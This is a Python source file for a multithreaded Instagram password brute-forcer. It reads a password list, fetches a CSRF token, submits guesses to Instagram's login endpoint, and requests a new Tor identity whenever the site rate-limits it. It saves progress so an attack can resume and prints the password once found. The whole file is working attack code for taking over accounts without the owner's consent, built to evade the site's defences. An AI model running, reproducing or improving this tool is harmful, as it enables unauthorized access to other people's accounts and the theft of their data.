import requests
import threading
import json
from time import sleep
from sys import exit as sysexit, stderr

class Bruter(threading.Thread):

    # public constants
    ERR_HOMEPAGE_FETCH_FAILED = 0
    ERR_HTTP_CODE_NOT_OK = 1
    ERR_TOKEN_NOT_FOUND = 2
    ERR_CONNECTION_FAILED = 3
    ERR_INVALID_RESPONSE = 4
    ERR_TOO_MANY_REQUESTS = 5

    def __init__(self, username, passlist_file, config, on_success_callback, on_error_callback, thread_number):
        threading.Thread.__init__(self, name = 'Bruter%s' % thread_number)

        # private constants
        self.__INSTA_HOME_URL = 'https://www.instagram.com'
        self.__INSTA_API_URL = 'https://www.instagram.com/accounts/login/ajax/'
        self.__TOKEN_COOKIE_NAME = 'csrftoken'
        self.__TOKEN_HEADER_NAME = 'X-CSRFToken'
        self.__TIMEOUT = 3 # in seconds

        # thread lock
        self.__lock = threading.Lock()
        
        self.__passlist_file = passlist_file

        self.__on_success = on_success_callback # on_success(found, password)
        self.__on_error = on_error_callback # on_error(error_code)

        self.__username = username
        self.__running = True
        
        self.__usetor = False if config['usetor'] == '0' else True
        if self.__usetor:
            self.__tor_hostname = config['torhostname']
            self.__tor_control_port = int(config['torcontrolport'])
            self.__tor_control_port_password = config['torcontrolportpassword']
            self.__tor_socks_port = config['torsocksport']

    def next_password(self):
        with self.__lock:
            line = self.__passlist_file.readline()
            if line == '':
                return ''
            if line[-1] == '\n':
                line = line[:-1]
            return line
        return ''

    def get_new_tor_identity(self):
        import socket as sock
        connection = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        connection.connect((self.__tor_hostname, self.__tor_control_port))
        connection.send(('AUTHENTICATE "%s"\n' % self.__tor_control_port_password).encode())
        connection.send(b'signal NEWNYM\n')
        connection.close()
        sleep(10)

    def auth(self, password):
        
        # initialize proxy:
        proxy = None
        if self.__usetor:
            proxy = {
                'http' : 'socks5://%s:%s' % (self.__tor_hostname, self.__tor_socks_port),
                'https' : 'socks5://%s:%s' % (self.__tor_hostname, self.__tor_socks_port)
            }
        
        while self.__running:
            # first, GET the home page and obtain the token
            try:
                response = requests.get(self.__INSTA_HOME_URL, proxies = proxy, stream = True)
                response.close()
            except requests.exceptions.ConnectionError:
                # try again
                # self.__notifier.notify(msg = 'Could not fetch home page.')
                self.__on_error(Bruter.ERR_HOMEPAGE_FETCH_FAILED)
                continue

            if response.status_code != 200:
                # self.__notifier.notify(msg = 'Received status code %s from server.' % response.status_code)
                self.__on_error(Bruter.ERR_HTTP_CODE_NOT_OK)
                continue
            
            try:
                token = response.cookies[self.__TOKEN_COOKIE_NAME]
            except KeyError:
                # try again
                # self.__notifier.notify(msg = 'Could not find token in cookies.')
                self.__on_error(Bruter.ERR_TOKEN_NOT_FOUND)
                continue
            
            # prepare the datas to send to api url
            data = {
                'username' : self.__username,
                'password' : password
            }

            # prepare the headers to send to api url
            headers = {
                'Referer' : self.__INSTA_HOME_URL,
                'Connection' : 'close',
                self.__TOKEN_HEADER_NAME : token
            }

            try:
                response = requests.post(url = self.__INSTA_API_URL, data = data, headers = headers, proxies = proxy)
            except requests.exceptions.ConnectionError:
                # try again
                # self.__notifier.notify(msg = 'Could not test user/pass.')
                self.__on_error(Bruter.ERR_CONNECTION_FAILED)
                continue

            try:
                response = response.json()
            except ValueError:
                # try again
                # self.__notifier.notify(msg = 'Could not parse response from server: Invalid JSON format.')
                self.__on_error(Bruter.ERR_INVALID_RESPONSE)
                continue
            
            # print(response)

            if 'authenticated' in response:
                self.__on_success(response['authenticated'], password)
                # print(response['authenticated'])
                return response['authenticated']
            else:
                # Should change ip
                # self.__notifier.notify(msg = 'Too many requests. Requesting new Tor identity...')
                self.__on_error(Bruter.ERR_TOO_MANY_REQUESTS)
                if self.__usetor:
                    self.get_new_tor_identity()
                continue

    def run(self):
        password = self.next_password()
        while not password == '':
            #print('Trying password: %s' % password)
            if self.auth(password = password):
                self.__on_success(True, password)
                break
            password = self.next_password()
        
        # print('Stopping thread')
        return

    def stop(self):
        self.__running = False

class Attacker():
    def __init__(self, config, **kwargs):
        # all the config goes here:
        self.__config = {}

        # first, read config file:
        self.__config_file = config.get('config_file', 'instabruter.conf')
        with open(file = self.__config_file, mode = 'r') as config_file:
            for line in config_file:
                parsed_line = line[:-1].split(' ') # [:-1] : for removing the \n from end of `line`
                if len(parsed_line) != 2: # not a parsable line, lets just ignore it
                    continue
                self.__config[parsed_line[0].lower()] = parsed_line[1]
        
        # then, read the saved attack file, if any:
        self.__saved_attack_file = config.get('saved_scan_file', None)
        if self.__saved_attack_file != None:
            with open(file = self.__saved_attack_file, mode = 'r') as saved_scan_file:
                saved_attack_config = json.load(fp = saved_scan_file)
                # update, only if the new value is NOT None:
                for key in saved_attack_config:
                    if key not in self.__config:
                        self.__config[key] = saved_attack_config[key]
                    else:
                        if saved_attack_config[key] != None:
                            self.__config[key] = saved_attack_config[key]
        
        # and at last, parse the config, passed to __init__:
        # update, only if the new value is NOT None:
        for key in config:
                if key not in self.__config:
                    self.__config[key] = config[key]
                else:
                    if config[key] != None:
                        self.__config[key] = config[key]
        


        self.__passlist = self.__config['passlist']
        self.__threads = int(self.__config.get('threads', 8))
        self.__total_scanned = int(self.__config.get('totalscanned', 0))

        # count the number of lines of passlist file
        with open(file = self.__passlist, mode = 'r') as passlist_file:
            self.__passlist_lines_count = sum([1 for line in passlist_file])
        
        # init the file object, to pass to bruter threads
        self.__passlist_file = open(file = self.__passlist, mode = 'r')

        # go until the last read line
        for i in range(self.__total_scanned):
            self.__passlist_file.readline()
        
        # keeps a list of bruter objects
        self.__bruters = []

    def start(self):
        def on_success(is_found, password):
            # For each successful scan (whether the password is found or not), this callback will trigger.
            if is_found:
                self.stop()
                self.block()
                print()
                print('Password: %s' % password)
                sysexit(0)
            else:
                self.__total_scanned += 1
                print('\r ==> Scanning: %s/%s (%s%%)' % (
                    self.__total_scanned,
                    self.__passlist_lines_count,
                    int((self.__total_scanned / self.__passlist_lines_count) * 10000) / 100
                ), end = '')
                cur_status = {
                    'username' : self.__config['username'],
                    'passlist' : self.__passlist,
                    'threads' : self.__threads,
                    'totalscanned' : self.__total_scanned,
                    'usetor' : self.__config['usetor'],
                    'torhostname' : self.__config['torhostname'],
                    'torsocksport' : self.__config['torsocksport'],
                    'torcontrolport' : self.__config['torcontrolport'],
                    'torcontrolportpassword' : self.__config['torcontrolportpassword']
                }
                cur_status = json.dumps(cur_status)
                with open(file = '%s.isb' % self.__config['username'], mode = 'w') as continue_attack_file:
                    continue_attack_file.write(cur_status)

        def on_error(error_code):
            # If there is any error, this callback will trigger. The `error_code` shows what was the
            # problem. It will contain either Bruter.ERR_HOMEPAGE_FETCH_FAILED, Bruter.ERR_HTTP_CODE_NOT_OK,
            # Bruter.ERR_TOKEN_NOT_FOUND, Bruter.ERR_CONNECTION_FAILED, Bruter.ERR_INVALID_RESPONSE or
            # Bruter.ERR_TOO_MANY_REQUESTS.
            pass
        
        for i in range(self.__threads):
            bruter = Bruter(self.__config['username'], self.__passlist_file, self.__config, on_success, on_error, i + 1)
            self.__bruters.append(bruter)
            bruter.start()
            print(' ==> Starting thread: %s/%s\r' % (i + 1, self.__threads), end = '')

        print()        
        print(' ==> Starting attack for %s' % self.__config['username'])
    
    def stop(self):
        for bruter in self.__bruters:
            bruter.stop()
    
    def block(self):
        for bruter in self.__bruters:
            bruter.join()
    
    def __del__(self):
        self.stop()